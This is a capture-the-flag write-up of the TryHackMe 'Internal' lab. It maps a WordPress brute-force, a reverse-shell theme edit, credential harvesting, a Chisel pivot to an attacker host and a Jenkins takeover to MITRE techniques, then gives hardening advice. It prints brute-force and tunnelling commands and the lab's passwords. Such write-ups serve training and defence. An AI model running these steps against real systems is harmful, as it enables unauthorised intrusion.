---
title: "TryHackMe Writeup: Internal"
date: 2025-11-30
description: "Black box assessment involving WordPress brute-force, internal pivoting via SSH/Chisel, and Jenkins compromise leading to root."
tags: ["tryhackme", "wordpress", "pivoting", "jenkins", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Executive Summary

Comprehensive internal environment compromise following PTES guidelines. Initial access was secured via brute-forcing an outdated WordPress instance, leading to RCE. Internal enumeration uncovered credentials allowing SSH access, which was subsequently used as a pivot point. Port forwarding enabled access to an isolated internal Jenkins server, which was compromised to extract root credentials in plaintext.

### Attack Chain (PTES Mapping)

#### 1. Reconnaissance & Web Enumeration
Scanning identified a web server hosting a WordPress blog. WPScan enumerated the user `admin`.
```bash
sudo nmap -Pn -sS -p- -T4 -sV 10.65.175.43
wpscan --url [http://internal.thm/blog](http://internal.thm/blog) -e u
```
* **MITRE Technique:** [T1595](https://attack.mitre.org/techniques/T1595/) - Active Scanning.

#### 2. Initial Exploitation
A dictionary attack against the `admin` account successfully retrieved the password (`my2boys`). Access to the WordPress dashboard allowed the modification of the `404.php` theme file to execute a PHP reverse shell.
```bash
wpscan --url [http://internal.thm/blog](http://internal.thm/blog) -U admin -P rockyou.txt
```
* **MITRE Technique:** [T1110.001](https://attack.mitre.org/techniques/T1110/001/) - Brute Force: Password Cracking.
* **MITRE Technique:** [T1505.003](https://attack.mitre.org/techniques/T1505/003/) - Server Software Component: Web Shell.

#### 3. Internal Enumeration & Lateral Movement
A file located at `/opt/wp-save.txt` contained plaintext SSH credentials (`aubreanna:bubb13guM!@#123`). This access was utilized to establish an SSH session.
* **MITRE Technique:** [T1552.001](https://attack.mitre.org/techniques/T1552/001/) - Unsecured Credentials: Password in Files.

#### 4. Pivoting & Internal Exploitation
Internal network enumeration (via `netstat`) revealed a Jenkins service bound to `127.0.0.1:8080`. Chisel was deployed to create a remote port forward, exposing the Jenkins interface to the attacker's machine.
```bash
chisel client <ATTACKER_IP>:<PORT> R:8080:127.0.0.1:8080
```
* **MITRE Technique:** [T1090](https://attack.mitre.org/techniques/T1090/) - Connection Proxy.

Hydra was used to brute-force the Jenkins login (`admin:spongebob`), granting access to the script console for RCE.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 http-post-form
```

#### 5. Privilege Escalation
A file named `Note.txt` located within the Jenkins environment contained the root SSH credentials in plaintext (`root:tr0ubl13guM!@#123`), yielding total system control.
* **MITRE Technique:** [T1552.001](https://attack.mitre.org/techniques/T1552/001/) - Unsecured Credentials: Password in Files.

### Recommendations (NIST SP 800-115)

* **Authentication Policies:** Enforce strong password policies and Multi-Factor Authentication (MFA) across all services (WordPress, SSH, Jenkins).
* **Application Hardening:** Disable the WordPress theme editor (`define('DISALLOW_FILE_EDIT', true);`).
* **Data Security:** Conduct an immediate audit to remove all plaintext credentials from system files (`wp-save.txt`, `Note.txt`).
* **Network Segmentation:** Ensure administrative interfaces (like Jenkins) are placed in strictly segmented VLANs with strict RBAC controls.